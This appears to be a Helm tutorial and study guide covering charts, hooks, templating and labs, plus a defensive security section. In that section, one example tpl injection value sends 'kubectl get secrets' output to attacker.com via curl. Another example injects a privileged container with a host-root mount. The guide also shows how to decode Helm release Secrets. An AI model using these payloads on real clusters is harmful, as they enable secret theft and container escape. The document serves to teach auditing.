overview

01 · What Is Helm and Why Does It Exist

Helm is the most widely used package manager for Kubernetes. Think of it the same way you think about apt on Ubuntu or npm in Node.js — instead of manually installing things, you describe what you want and Helm handles the complexity.

Without Helm, deploying a real application to Kubernetes means writing a separate YAML file for every Kubernetes object — a Deployment, a Service, a ConfigMap, an Ingress, maybe a ServiceAccount. Then you have to duplicate all of those files for every environment (dev, staging, prod), and manually edit the parts that differ (like image tags, replica counts, domain names). That becomes unmaintainable fast.

Helm solves this by letting you write templates once — with placeholders for the things that change — and then supply the different values per environment. The same chart deploys to staging with 1 replica and to production with 10.

Where Helm sits in the DevOps stack

Your code
    ↓
Docker image (artifact)
    ↓
Helm chart (deployment package)   ← Helm lives here
    ↓
Kubernetes cluster (runtime)
    ↓
Cloud infrastructure (AWS/GCP/Azure)

Helm is commonly used together with CI/CD pipelines (like GitHub Actions, GitLab CI) and GitOps tools (like ArgoCD) to automate the full path from "code merged" to "running in production."

Three core concepts before anything else

Chart: A Helm package. It contains templates (Kubernetes manifests with placeholders), a values.yaml file with default config, and a Chart.yaml with metadata. Think of it like an npm package — it's the thing you distribute and reuse.

Release: When you install a chart into a cluster, that installed instance is called a release. You give it a name. One chart can produce multiple releases — for example, the same PostgreSQL chart deployed as postgres-staging in one namespace and postgres-prod in another. A release is not the same as the application version — it's Helm's own internal concept for "this chart was installed here, with this config, at this time."

Repository: A place where charts are stored and distributed — like Docker Hub, but for Helm charts. The most common is Artifact Hub.

The comparison to Jinja2 (Python) is accurate for understanding Go templates: both take a template file with placeholders, a data context, and render the final output. The syntax is different ({{ .Values.x }} instead of {{ x }}) but the mental model is identical.

Quick Check — Overview
What problem does Helm solve compared to raw Kubernetes YAML?
Raw YAML has to be duplicated and manually edited for each environment. Helm uses templates with placeholders so you write the structure once, then supply different values per environment — reducing repetition, human error, and the cost of maintaining many copies of nearly-identical files.
What is the difference between a Chart, a Release, and a Repository?
Chart = the package (templates + default values + metadata). Release = a named, installed instance of a chart in a cluster, with its own config and history. Repository = a server/service where charts are stored and downloaded from. One chart can produce many releases; one repository can host many charts.
Is a release the same as the application version?
No — and this is a common confusion. The release is Helm's own tracking concept: "this chart was installed in this namespace with this name at this time." The application version is tracked separately in the image tag (e.g. nginx:1.25.0). You can upgrade a release without changing the application version, and vice versa.

02 · How Helm Works Internally

The render-and-apply pipeline

When you run helm install, Helm doesn't just send your templates to Kubernetes. It goes through several precise steps first:

YOUR MACHINE
│
│  helm install myapp ./mychart -f values.yaml
│                     │
│                     ▼
│   ┌───────────────────────────────────────┐
│   │ Step 1: Load Chart.yaml + templates/   │
│   │ Step 2: Merge values.yaml + --set args │
│   │ Step 3: Render Go templates → raw YAML │
│   │ Step 4: Validate against K8s API schema│
│   └───────────────────────────────────────┘
│                     │
└─────────────────────┼──────────────────────
                       ▼
          ┌─────────────────────────┐
          │  KUBERNETES API SERVER   │
          │  (same as kubectl apply) │
          └─────────────────────────┘
                       │
                       ▼
          ┌─────────────────────────┐
          │  Release stored as a     │
          │  Kubernetes Secret in    │
          │  the same namespace      │
          └─────────────────────────┘

Step 3 is where the magic happens. Helm reads every file in templates/, replaces all {{ .Values.x }} placeholders with the actual values (from your merged values context), and produces plain Kubernetes YAML. That plain YAML is what gets sent to the cluster — not the template files themselves.

Helm 3 has no server-side component

This is a major architecture difference from Helm 2, and it matters for security. In Helm 3, the CLI running on your machine talks directly to the Kubernetes API server using your local kubeconfig file. There is nothing extra running inside the cluster.

Helm 2 had a component called Tiller. Tiller was a server that ran inside the Kubernetes cluster with cluster-admin privileges. This meant: (a) anyone who could reach Tiller (even without proper Kubernetes RBAC) could deploy anything to the cluster, (b) Tiller was effectively a privilege escalation path — low-privilege users could sometimes reach Tiller and get full admin access, (c) there was no audit trail of who triggered what deployment through Tiller. Helm 3 eliminated Tiller entirely. Your deployment permissions are now exactly whatever your kubeconfig user can do — no more, no less. This is the correct security model.

How revisions work — the internal tracking model

Every time you install or upgrade a release, Helm creates a new revision. Think of revisions as a numbered history of "what was deployed at this moment."

helm install myapp ./chart      →  Release "myapp", Revision 1
helm upgrade myapp ./chart      →  Release "myapp", Revision 2
helm upgrade myapp ./chart      →  Release "myapp", Revision 3  ← breaks something!
helm rollback myapp 2           →  Release "myapp", Revision 4  ← re-applies rev 2's config

The critical thing to understand: helm rollback does not delete revision 3 or "go back in time." It creates a brand-new revision 4 whose content is a copy of revision 2's configuration. The history is never rewritten. By default, Helm keeps the last 10 revisions — useful for auditing exactly what changed and when.

You can see all revisions with:

helm history myapp
Quick Check — Architecture
Why was Tiller removed in Helm 3, and what replaced it?
Why removed: Tiller ran inside the cluster with cluster-admin privileges, creating a privilege escalation path. Any user who could reach Tiller's API could deploy with full admin rights, bypassing normal RBAC. What replaced it: Nothing — Helm 3's CLI talks directly to the Kubernetes API server using your local kubeconfig credentials. Your Kubernetes permissions are now exactly what Helm can do.
What does helm rollback actually do internally?
It does NOT delete the broken revision or "rewind" history. It creates a brand-new revision that re-applies the configuration from the revision you specified. So if you had revisions 1–3 and ran rollback to 2, you now have revision 4 (which is a copy of rev 2's config). The history is always append-only — this is intentional for auditability.
What are the four steps Helm takes between helm install and the first resource appearing in the cluster?
1) Load Chart.yaml and all files in templates/. 2) Merge values.yaml with any --set flags or -f override files. 3) Render Go templates into plain YAML by replacing all {{ .Values.x }} placeholders. 4) Validate the resulting YAML against the Kubernetes API schema. Only after all four steps does Helm send the manifests to the API server.

03 · Chart Anatomy — What's Inside Every Chart

mychart/
├── Chart.yaml              # required — name, version, description, type, dependencies
├── Chart.lock              # auto-generated — locked dependency versions (like package-lock.json)
├── values.yaml             # default values for all templates
├── values.schema.json      # optional — JSON Schema to validate values.yaml structure
├── charts/                 # sub-chart dependencies downloaded here as .tgz files
├── crds/                   # Custom Resource Definitions — special treatment (see below)
├── templates/
│   ├── deployment.yaml     # has {{ .Values.replicaCount }} style placeholders
│   ├── service.yaml
│   ├── ingress.yaml
│   ├── serviceaccount.yaml
│   ├── hpa.yaml            # horizontal pod autoscaler (conditional template)
│   ├── _helpers.tpl        # underscore = library file, never rendered directly
│   ├── NOTES.txt           # shown to the user after helm install completes
│   └── tests/
│       └── test-connection.yaml   # a "test" hook for helm test
└── .helmignore             # like .gitignore — excludes files from helm package

Chart.yaml — the manifest

apiVersion: v2
name: mychart
version: 0.1.0           # Chart version — bump this when you change the chart itself
appVersion: "1.16.0"     # Application version — the version of the app being deployed
description: A Helm chart for Kubernetes
type: application         # can be "application" or "library" (see section 11)

values.yaml — the defaults

This file provides the default values for every placeholder in your templates. Users can override any value when they install/upgrade — but if they don't, the value from values.yaml is used. Think of it as the "factory settings" for the chart.

The difference between chart version and app version

version in Chart.yaml tracks the chart itself — bump it when you change the templates or structure. appVersion tracks the application being deployed — it's just metadata, Helm doesn't enforce it. You can update the chart without touching the app version, and vice versa.

Quick Check — Chart Anatomy
What is values.schema.json and why is it useful?
It's a JSON Schema file at the chart root that validates the structure and types of values.yaml before any install or upgrade is attempted. Without it, a wrong type (like passing a string where a number is expected) fails at Kubernetes with a confusing error. With the schema, Helm catches it immediately with a clear message. Especially important on shared charts where multiple people edit values.yaml.
What is the Chart.lock file and when is it created?
It's auto-generated when you run helm dependency update. It records the exact versions of every sub-chart dependency that was downloaded, similar to package-lock.json in npm. This ensures reproducible builds — everyone gets the exact same sub-chart versions, not just the latest that satisfies a version range.
What is the difference between chart version and appVersion in Chart.yaml?
version tracks the Helm chart itself — bump it when you change templates, fix bugs in the chart structure, or add new features to the chart. appVersion is metadata describing what application is being deployed (e.g. "1.25.0" for nginx). Helm doesn't use appVersion for anything — it's informational. They change independently.

04 · Core Commands and Lifecycle

CommandWhat it doesWhen to use it
helm install <name> ./chart -f values.yamlInstalls a new release at revision 1First time deploying
helm upgrade <name> ./chart --set key=valUpdates an existing release, creates new revisionDeploying a change
helm upgrade --install <name> ./chartInstall if missing, upgrade if presentCI/CD pipelines — idempotent pattern
helm upgrade <name> ./chart --atomicUpgrade + auto-rollback on failureProduction upgrades where stability matters
helm history <name>Lists all revisions with status and timestampsAuditing changes, deciding what to roll back to
helm rollback <name> <revision>Re-applies an old revision's config as a new revisionRecovering from a broken upgrade
helm template ./chartRenders all templates locally, no cluster neededTesting template logic before installing
helm lint ./chartChecks chart for structural/syntax issuesIn CI, before publishing or deploying a chart
helm test <name>Runs test-hook resources against a deployed releasePost-deploy smoke test
helm uninstall <name>Removes all resources created by the releaseTearing down an environment

The --set flag and value precedence

Values are merged in a specific priority order. Higher in the list overrides lower:

  1. --set key=value passed directly on the command line (highest priority)
  2. -f custom-values.yaml passed as an override file
  3. values.yaml inside the chart (lowest priority — the defaults)

This means you can ship a chart with sensible defaults in values.yaml, let teams override with their own -f prod-values.yaml, and still allow one-off overrides with --set.

Quick Check — Commands
Why is helm upgrade --install the standard pattern in CI/CD instead of separate install/upgrade commands?
In a CI/CD pipeline, you often don't know whether a release already exists (first deploy vs. subsequent deploys). Using --install makes the same command work for both cases — it installs if the release is new, upgrades if it already exists. This makes pipelines simpler and avoids branching logic like "if release exists then upgrade else install."
If you pass --set replicaCount=5 and also have replicaCount: 3 in values.yaml, which value wins?
--set wins. The priority order is: --set (highest) → -f override file → chart's values.yaml (lowest). So the deployed Deployment will have 5 replicas, and the value 3 from values.yaml is ignored for this install/upgrade.
What does --atomic actually do and why should it be the default in production?
--atomic watches the upgrade after applying the new manifests. If any pod fails to start, readiness checks fail, or a hook fails, Helm automatically runs helm rollback to the previous working revision and marks the upgrade as failed. Without it, a broken upgrade leaves the release stuck in a "failed" state with potentially half-applied resources — your old version might be gone but the new version isn't working. In production, always use --atomic.

05 · Lab 1 — Install, Upgrade & Decoding the Release Secret

Goal: Install a chart, upgrade it, then go one level deeper than anyone usually goes — decode the Helm release Secret to see what Helm actually stores about your deployment.

Commands run

helm install secure-test ./mychart -f values.yaml
helm upgrade secure-test ./mychart --set replicaCount=5
kubectl get secrets -n helm-lab

Output

NAME                                TYPE                 DATA   AGE
sh.helm.release.v1.secure-test.v1   helm.sh/release.v1   1      3m30s
sh.helm.release.v1.secure-test.v2   helm.sh/release.v1   1      91s

Two separate Secret objects — one per revision. The naming pattern is always sh.helm.release.v1.<release-name>.v<revision-number>. Revision 1 (the initial install) is still there even after the upgrade. This is how rollback works — those old Secret objects contain everything needed to restore the previous state.

Decoding the release Secret — what's actually inside

kubectl get secret sh.helm.release.v1.secure-test.v2 -n helm-lab \
  -o jsonpath='{.data.release}' | base64 -d | base64 -d | gzip -d

Why double base64 + gzip? Helm encodes the release data as base64 → gzip → base64 before writing it to the Secret. On top of that, Kubernetes itself stores all Secret values as base64. So the full decode chain is: Kubernetes's base64 → Helm's outer base64 → gzip decompress → plain JSON.

What was found in the decoded output

FieldMeaningSecurity implication
"version":2This is revision 2—
"config":{"replicaCount":5}The exact --set override used during upgradeStored permanently in plaintext — if this was a password instead of a replica count, it would be fully readable
"values":{...}The fully merged values.yaml (defaults + all overrides)Complete config snapshot — includes everything that was in values.yaml at deploy time
"manifest":"..."The fully rendered YAML actually sent to the Kubernetes APIThis is the final output — you can see every field of every resource that was applied
"chart":{"templates":[...]}The entire chart source code, base64-encoded again insideTemplates, helpers, NOTES.txt — the full chart is stored, not just a reference to it
"apply_method":"ssa"Helm 3 uses Server-Side Apply to send manifests—

This is the Kubernetes version of finding a .git folder exposed on a web server. One object, full history, full source. If you ever do a security review of a cluster, kubectl get secrets -A | grep helm.sh/release should be one of your first commands — and checking who has RBAC permission to read those secrets is a real finding worth reporting.

Quick Check — Lab 1
Are Helm release Secrets encrypted?
No. They are base64-encoded and gzip-compressed — but that is encoding, not encryption. Encoding is reversible by anyone with access to the object. Encryption requires a key. So the data is entirely readable by anyone who can run kubectl get secret on that object. The security comes from RBAC (controlling who can access the secret), not from the encoding itself.
Why does decoding the secret require the command base64 -d | base64 -d | gzip -d with double base64?
There are two layers of base64: 1) Kubernetes always stores Secret values as base64 — that's the first layer. 2) Helm itself encodes the release data as base64 → gzip → base64 before storing it — the outer base64 and the gzip are Helm's own encoding on top. So total decode = Kubernetes base64 → Helm's outer base64 → gzip decompress = plain readable JSON.
What would you look for if you were auditing a cluster's Helm usage for security issues?
1) Run kubectl get secrets -A | grep helm.sh/release to find all Helm release Secrets cluster-wide. 2) Check who has RBAC permission to run kubectl get/list secrets in those namespaces — that's who can read all Helm values including any credentials. 3) Decode a few release Secrets and look for plaintext passwords, tokens, or connection strings in the "values" or "config" fields. 4) Check if the same sensitive values appear in Git history for the values.yaml files.

06 · Helm Hooks — Deep Dive

A Helm hook is not a webhook. A webhook waits for an external HTTP call to trigger it. A Helm hook is the opposite — it is triggered automatically by Helm itself, at a specific point in the release lifecycle. Nothing external calls it. Helm decides when to run it, and Helm waits for it to finish before proceeding.

The full lifecycle with hooks

helm install myapp ./chart
         │
         ▼
┌──────────────────────┐
│   pre-install hooks   │ ← Helm creates these FIRST
│   Job/Pod runs here   │   Helm waits for them to complete
│   Must succeed        │   If they fail: install STOPS here
└──────────┬────────────┘
           ▼
┌──────────────────────┐
│  Normal templates     │ ← Only created AFTER pre-install hooks succeed
│  deployment.yaml      │   Deployment, Service, ConfigMap, etc.
│  service.yaml         │
└──────────┬────────────┘
           ▼
┌──────────────────────┐
│   post-install hooks  │ ← Run AFTER all normal resources are created
│   Job/Pod runs here   │   Useful for verification, notifications
└──────────┬────────────┘
           ▼
       Release = "deployed"

All hook types

Hook nameRuns whenCommon real-world use
pre-installBefore any resources on first installDatabase schema setup, secret pre-seeding
post-installAfter all resources on first installSending a Slack notification, health checks
pre-upgradeBefore resources are updatedDatabase migrations before the new code runs
post-upgradeAfter resources are updatedCache warmup, smoke tests
pre-deleteBefore resources are deletedBacking up data before deletion
post-deleteAfter resources are deletedCleanup of external resources (DNS, S3 buckets)
pre-rollbackBefore rolling backPreparing the database for an older schema
post-rollbackAfter rolling backNotifications, verification
testOnly when helm test <release> is run manuallyConnection tests, smoke tests on demand

Hook annotations — how Helm identifies hooks

A hook is just a normal Kubernetes resource (usually a Job or Pod) with special annotations. It's the annotations that tell Helm "treat this differently."

metadata:
  annotations:
    "helm.sh/hook": pre-install           # which lifecycle point
    "helm.sh/hook-weight": "0"            # run order when multiple hooks share a point
    "helm.sh/hook-delete-policy": hook-succeeded  # when to delete this resource

Hook weight — ordering multiple hooks

If you have three pre-install hooks, Helm runs them in order of their weight — lowest number first. So -5 runs before 0 which runs before 10. Hooks with the same weight run in alphabetical order by name. Default weight is 0 if not specified.

Hook delete policies — cleanup behavior

PolicyWhen the hook resource is deleted
before-hook-creationBefore Helm creates the hook resource on the next run (default — the Job stays until next upgrade)
hook-succeededImmediately after the hook completes successfully
hook-failedImmediately if the hook fails

Failure behavior — what happens when things go wrong

ScenarioWithout --atomicWith --atomic
pre-install hook failsInstall stops, no resources created — nothing to roll backSame behavior — nothing was installed yet
post-install hook failsResources are deployed but release is marked "FAILED" — you must manually fixHelm automatically runs uninstall to clean up
Normal upgrade fails (pod won't start)Release stuck in "failed" state — partial resources, old version may be goneHelm automatically rolls back to previous working revision

The most common real-world use for pre-upgrade hooks is database migrations. You run the migration Job first to update the schema, then Helm deploys the new application version. If the migration fails, the upgrade stops and the old app version continues running on the old schema — safe.

Quick Check — Hooks
What is the difference between a hook and a webhook?
A webhook waits passively for an external HTTP request to trigger it. A Helm hook is the opposite — it is triggered automatically by Helm itself, at a specific lifecycle point (like pre-install or post-upgrade). Nothing external "calls" it. Helm creates it, waits for it to complete, and then decides whether to proceed or stop.
What does hook-delete-policy: hook-succeeded do, and why did kubectl get job show nothing right after install?
hook-succeeded deletes the Job (and its Pod) immediately after the Job completes successfully. By the time you ran kubectl get job right after helm install returned, the cleanup had already happened — the hook had completed and been deleted within seconds. That's the policy working exactly as intended.
How does the live -w watch output prove that pre-install blocks the rest of the install?
In the -w output, you can see the hook Pod go through Pending → ContainerCreating → Completed, stay visible briefly, then disappear (the delete policy firing) — and only after that do the Deployment pods start appearing. If Helm ran them in parallel, both would appear at the same time. The fact that Deployment pods only appear after the hook Pod is gone proves the blocking behavior.
What is hook-weight used for?
It controls the run order when you have multiple hooks at the same lifecycle point. Helm runs hooks in ascending order of weight (lowest number first). So if you have three pre-install hooks with weights -5, 0, and 10, they run in that order. Hooks with identical weights run alphabetically by name. This matters when later hooks depend on earlier ones (e.g. "create the S3 bucket before seeding it").

07 · Lab 2 — Watching the Hook Lifecycle Live

Goal: observe the hook lifecycle order and delete-policy in real time using kubectl get pods -w started before the install.

The hook used

apiVersion: batch/v1
kind: Job
metadata:
  name: pre-install-hook-job
  annotations:
    "helm.sh/hook": pre-install
    "helm.sh/hook-weight": "0"
    "helm.sh/hook-delete-policy": hook-succeeded
spec:
  template:
    spec:
      containers:
      - name: busybox-hook
        image: busybox
        command: ["sh", "-c", "echo pre-install hook ran"]
      restartPolicy: Never

Quick Check — Lab 2
Why did the first kubectl get job run right after install show "No resources found"?
Because hook-delete-policy: hook-succeeded deleted the Job and its Pod immediately after the Job completed successfully. helm install doesn't return until the entire lifecycle completes (including the delete policy cleanup). So by the time your shell prompt came back and you ran kubectl get job, the cleanup had already finished — the Job had existed and been deleted within a few seconds during the install.
How would you see the hook mid-execution if the hook ran a longer task?
Run kubectl get pods -n helm-lab -w in a separate terminal window BEFORE starting helm install. The -w flag watches for changes in real time. For a longer task (like a 60-second database migration), you'd see the hook Pod in Running state for a full minute before it moves to Completed. The fast busybox echo command made it hard to catch in the first kubectl get attempt.
template-syntax

08 · Template Syntax — The Full Picture

Why underscore files exist

Helm renders every file inside templates/ as a Kubernetes manifest — unless the filename starts with an underscore (_). Underscore-prefixed files are treated as library files: they are loaded and parsed, but never directly rendered into a resource.

templates/
├── deployment.yaml      ← rendered → becomes a real Deployment in the cluster
├── service.yaml          ← rendered → becomes a real Service
└── _helpers.tpl           ← NOT rendered directly
                              only holds {{ define "name" }}...{{ end }} blocks
                              that other templates call via {{ include "name" . }}

If you removed the underscore and named it helpers.tpl, Helm would try to render it as a standalone Kubernetes manifest. It would fail immediately because a file full of {{ define }} blocks has no apiVersion or kind — so it's not a valid Kubernetes object.

The dot (.) — the most important symbol in Helm templates

The dot represents the current data context — "what data am I allowed to look at from here." At the top level of any template, the dot is the root context:

┌───────────────────────────────────────────┐
│              .  (root context)              │
│                                              │
│   .Values         → everything in values.yaml│
│   .Release                                   │
│       .Release.Name   → the release name      │
│       .Release.Namespace → namespace deployed  │
│       .Release.Service   → "Helm"              │
│   .Chart          → contents of Chart.yaml     │
│       .Chart.Name                               │
│       .Chart.Version                             │
│   .Files          → access to non-template files │
│   .Capabilities   → info about the cluster       │
│       .Capabilities.KubeVersion                  │
└───────────────────────────────────────────────┘

The dot changes inside range and with

This is the #1 source of confusing bugs in Helm. Inside a {{ range }} or {{ with }} block, the dot gets reassigned to the loop item or the sub-object. You lose direct access to the root context.

# BROKEN — .Release.Name is not accessible inside range
{{- range .Values.items }}
  name: {{ .name }}
  release: {{ .Release.Name }}   # ← ERROR: "." here is the current item, not root
{{- end }}

# CORRECT — save root context before entering the loop
{{- $root := . -}}
{{- range .Values.items }}
  name: {{ .name }}                   # dot = current item
  release: {{ $root.Release.Name }}   # $root = the saved root context
{{- end }}

include vs template — why charts always use include

Both call a named template (defined with {{ define "name" }}), but they behave differently:

Featuretemplate (built-in Go action)include (Helm function)
Can be piped into functions❌ No — prints directly to output✅ Yes — returns a string first
Works with | nindent 4❌ No✅ Yes
Works with | upper, | quote❌ No✅ Yes
Used in real-world chartsRarelyAlmost always
# BROKEN — can't pipe template
labels:
  {{ template "mychart.labels" . | nindent 4 }}   # syntax error

# CORRECT — include returns string, can be piped
labels:
  {{- include "mychart.labels" . | nindent 4 }}

include exists specifically to solve this one limitation of template. That's its entire reason for existing in Helm.

Whitespace control — the hyphens

This is subtle but breaks things if you ignore it. Every line in a template file is a "line of text" to the Go engine. When Go renders a {{ if }} or {{ end }} line, it leaves behind a blank line in the output for that line — because that line "existed" in the file.

# Without hyphens — the {{ define }} and {{ end }} lines produce blank lines
{{ define "mychart.testLabel" }}
test-label: helm-deep-dive
{{ end }}

# Renders with blank lines in the output:
metadata:
  labels:

    test-label: helm-deep-dive

# With hyphens — trim whitespace on both sides of each control tag
{{- define "mychart.testLabel" -}}
test-label: helm-deep-dive
{{- end }}

# Renders cleanly:
metadata:
  labels:
    test-label: helm-deep-dive
SyntaxEffect
{{-Trims all whitespace (including newline) immediately before this tag
-}}Trims all whitespace (including newline) immediately after this tag

YAML is whitespace-sensitive. A stray blank line in the wrong place can be purely cosmetic — or it can produce a completely invalid YAML document that makes helm install fail with a confusing parser error that has nothing to do with your actual logic. Always add hyphens to control lines by default.

Quick Check — Template Syntax
What happens if you remove the underscore from _helpers.tpl?
Helm treats every file in templates/ without an underscore prefix as a Kubernetes manifest to render and apply. Without the underscore, Helm tries to render helpers.tpl as a standalone object. Since the file only contains {{ define }} blocks with no apiVersion or kind, Helm fails with a parse error — you'd see something like "manifest rendering error: could not get apiVersion."
Why does the dot (.) cause bugs inside range loops?
Inside a range block, Helm reassigns . to the current loop item. So .Release.Name no longer refers to the release name — it tries to look up "Release" on the loop item object, which doesn't exist, and renders as <no value>. The fix is to save the root context before entering the loop: {{- $root := . -}}, then use $root.Release.Name inside the loop instead of .Release.Name.
Why does include exist if template already does the same thing?
template is a built-in Go action that writes its output directly to the template's output stream — you can't capture it as a string to pipe elsewhere. include is a Helm-specific function that calls the named template but returns the result as a string, allowing you to pipe it into functions like | nindent 4 for indentation. include exists solely to work around this limitation of the built-in template action.
What does {{- do that {{ doesn't?
{{- trims all whitespace characters (spaces, tabs, newlines) immediately before the tag — the whitespace that comes before the {{ in the file. Without the hyphen, the newline at the end of the previous line is preserved in the output. This matters because each {{ define }}, {{ if }}, {{ range }}, and {{ end }} line in the template file contributes a newline to the rendered output unless you trim it with the hyphen.

09 · Lab 3 — Proving Whitespace Control Side by Side

Goal: make the same helper, render the chart twice — once with hyphens, once without — and directly observe what the hyphens do to the output.

Helper added to _helpers.tpl

{{- define "mychart.testLabel" -}}
test-label: helm-deep-dive
{{- end }}

Called in service.yaml

{{- include "mychart.testLabel" . | nindent 4 }}

WITH hyphens — helm template output

  selector:
    app.kubernetes.io/name: mychart
    app.kubernetes.io/instance: test
    test-label: helm-deep-dive

WITHOUT hyphens (removed from define and end) — same render

  selector:
    app.kubernetes.io/name: mychart
    app.kubernetes.io/instance: test

    test-label: helm-deep-dive

The blank line is exactly the newline left behind by the {{ define }} line. The Go template engine treats that line as a line of text, and since there's no - to trim the trailing newline, it survives into the final output.

In this specific test the blank line was harmless because it was placed under selector: for quick testing. In a real deployment manifest, a stray blank line inside a multi-line string field, or incorrect indentation caused by accumulated whitespace from several control blocks, can produce YAML that the Kubernetes API rejects entirely — with a cryptic error about unexpected tokens.

Quick Check — Lab 3
In your own words: why does removing {{- from define produce a blank line in the output?
The {{ define "mychart.testLabel" }} line is a regular line of text in the file. When the template engine processes it, it removes the {{ define }} action itself, but the newline at the end of that line is still a character in the file. Without the - to trim it, that newline character survives into the rendered output as a blank line — because the engine has nothing else to put there. The hyphen tells the engine: "also consume the newline that came before me."
Why is an extra blank line sometimes a breaking bug, not just cosmetic?
YAML is indentation and structure sensitive. A blank line inside certain YAML constructs (like inside a multi-line block scalar, or between keys in a map that a strict parser expects to be continuous) can cause parse failures. Also, in complex templates with nested range/if/with blocks, stray newlines from multiple control tags can stack up and shift indentation — producing YAML that looks syntactically different from what you intended, causing helm install to fail with a confusing "could not parse manifest" error.
security

10 · Security Deep Dive

Security Specialist Section

This section is written specifically for someone with a web security background who wants to understand how the same classes of vulnerabilities they already know from web apps appear in Helm and Kubernetes.

Risk 1 — Secrets in values.yaml (Credentials in Version Control)

The most common mistake: teams put database passwords, API keys, or tokens directly in values.yaml because it's the easiest place to put them.

# values.yaml — DON'T do this
database:
  password: "super-secret-prod-password-123"
  apiKey: "sk-abc123xyz"

The problem: values.yaml is almost always committed to a Git repository. Once something is in Git history, it's there permanently even if you delete it from the latest commit. This is the exact same root cause as leaked API keys found in GitHub repos — the tool changed (Helm instead of code) but the behavior is identical.

The fix: Use a secrets manager. The two most common options in Kubernetes are Vault (HashiCorp) with the External Secrets Operator, or Sealed Secrets. Both encrypt the secret and store only the encrypted form in Git — the real value is injected into the cluster at runtime.

Risk 2 — Release Secrets are Readable (Credential Exposure via Helm Storage)

Even if someone avoids putting secrets in values.yaml directly — if any secret value is passed via --set during install/upgrade, it ends up stored in the Helm release Secret object in plaintext (encoded, not encrypted).

The attack surface: Anyone who can run kubectl get secret -n <namespace> in a namespace where a Helm release exists can decode all Helm release data — including values that were passed as one-off --set overrides.

What to check in a cluster audit:

  1. Run kubectl get secrets -A | grep helm.sh/release to find all Helm release Secrets cluster-wide
  2. Check who has RBAC permission to read secrets in those namespaces
  3. Decode a sample release Secret and search the "values" field for anything sensitive
  4. Look at how many revisions are stored — old credentials from rotated secrets may still exist in old revisions

Risk 3 — Untrusted Charts (Supply Chain Attack)

When you run helm install from a public repository, you are executing arbitrary YAML in your cluster. That YAML can declare Deployments with hostPath mounts (accessing the host filesystem), privileged containers (kernel-level access), or containers that run as root.

This is conceptually identical to installing an npm package from an untrusted author — the package runs code on your machine during install. A Helm chart runs YAML in your cluster during install.

The mitigations:

  • Only install charts from well-known, maintained sources (Bitnami, official project repos)
  • Always inspect a chart locally first: helm template ./chart | grep -E "hostPath|privileged|runAsRoot"
  • Use OPA/Gatekeeper or Kyverno to enforce policies that block dangerous patterns cluster-wide regardless of where the chart came from
  • Use Helm chart signing (helm package --sign) so you can verify the chart wasn't modified in transit

Risk 4 — Hook Supply Chain Attack

This is more specific and more dangerous than general chart trust. A pre-install hook runs before the main chart resources are created. This means if you inspect the templates folder and look at deployment.yaml, that's not enough — a malicious hook hidden in templates/hooks/setup.yaml runs code in your cluster before you ever see the Deployment.

The attack is directly parallel to a malicious postinstall script in a compromised npm package — code that runs automatically at a lifecycle point you might not review carefully.

What to look for when auditing a chart:

# Find all hooks in a chart before installing
helm template ./chart | grep -A5 "helm.sh/hook"

# Or inspect the chart directory directly
grep -r "helm.sh/hook" ./chart/templates/

Risk 5 — tpl Function (Server-Side Template Injection)

Helm's tpl function takes a string and renders it as a Go template dynamically at deploy time. If a chart does this:

# In a template file
command: [{{ tpl .Values.startupCommand . }}]

And an attacker controls what goes into .Values.startupCommand (via a CI/CD pipeline they partially influence, or by submitting a pull request to a values file), they can inject template expressions that evaluate during rendering. For example:

# Malicious value injected via values.yaml or --set
startupCommand: "{{ .Release.Name }}" && curl http://attacker.com/$(kubectl get secrets)

This is the exact same vulnerability class as Server-Side Template Injection (SSTI) in web applications — the same thing you hunt for in Jinja2/Twig/Smarty on web servers. Same mental model, different context. When auditing a Helm chart, search for all uses of tpl and ask: "who controls the values being passed into this?"

Risk 6 — Blind toYaml on User Input (Manifest Injection)

Charts often allow users to inject arbitrary YAML blocks using a pattern like this:

# In deployment.yaml template
spec:
  containers:
  - name: app
    {{- with .Values.extraContainerConfig }}
    {{- toYaml . | nindent 4 }}
    {{- end }}

If the chart does no validation on .Values.extraContainerConfig, a user can inject:

# In values.yaml — malicious injection
extraContainerConfig:
  volumeMounts:
  - name: host-root
    mountPath: /host
  securityContext:
    privileged: true

This adds a privileged container with a host filesystem mount — a classic container escape vector. The chart author thought they were being helpful by allowing flexible config; they accidentally opened a direct path to cluster compromise.

From a web security perspective, this is similar to a SQL injection via string concatenation — the developer intended to let users customize something limited, but the lack of validation allowed them to inject something structural.

Risk 7 — Missing required Function (Insecure Defaults)

Without required, a chart can be deployed with empty or null values for fields that should be mandatory:

# BAD — deploys with empty admin password if not set
adminPassword: {{ .Values.adminPassword }}

# GOOD — fails immediately with a clear error if not provided
adminPassword: {{ required "adminPassword must be set" .Values.adminPassword }}

Silent empty defaults are a common source of misconfigured production deployments — containers running with no auth, no TLS, no resource limits — all because nobody set the value and the chart didn't complain.

Risk 8 — No Chart Signature Verification

Helm supports signing charts with GPG via helm package --sign and verifying them with helm install --verify. Almost no team uses this. The practical risk: a chart distributed through a compromised repository (compromised Helm repo, MITM on HTTP-served charts) could be silently modified — replaced with a version that adds a malicious hook or changes the container image to one with a backdoor. Chart signing is the solution but adoption is low.

Quick Check — Security
Why is putting a password in values.yaml the same class of problem as a leaked API key in Git?
Because values.yaml is almost always committed to a Git repository, and Git history is permanent. Even if you remove the password from the latest commit, it's still readable in all previous commits. Anyone with read access to the repository — now or in the future, including if the repo becomes public — can retrieve it. The root cause is identical: a secret stored in a version control system that was designed for code, not credentials.
Why is the tpl function dangerous, and what web vulnerability is it similar to?
tpl renders a string as a Go template dynamically at deploy time. If an attacker controls the string being rendered — through a values file in a CI/CD system, a pull request to a shared values repo, or any other input path — they can inject template expressions that execute during rendering. This is Server-Side Template Injection (SSTI), the same vulnerability class as injecting Jinja2 or Twig expressions into a web app's template engine. The attack surface and mental model are identical; only the language and context differ.
How is the toYaml manifest injection risk similar to a web vulnerability you already know?
It's similar to SQL injection or HTTP parameter injection via string concatenation. The chart author intended to let users customize a small, bounded part of the configuration. By passing arbitrary YAML through toYaml without validation, users can inject structural fields (like volumeMounts with hostPath or securityContext: privileged: true) into the Deployment spec. The developer thought they were inserting a value; the attacker inserted structure — exactly the same pattern as SQL injection where the attacker turns a value into a query fragment.
As a security engineer, what are the four most important commands to run when auditing Helm in a cluster?
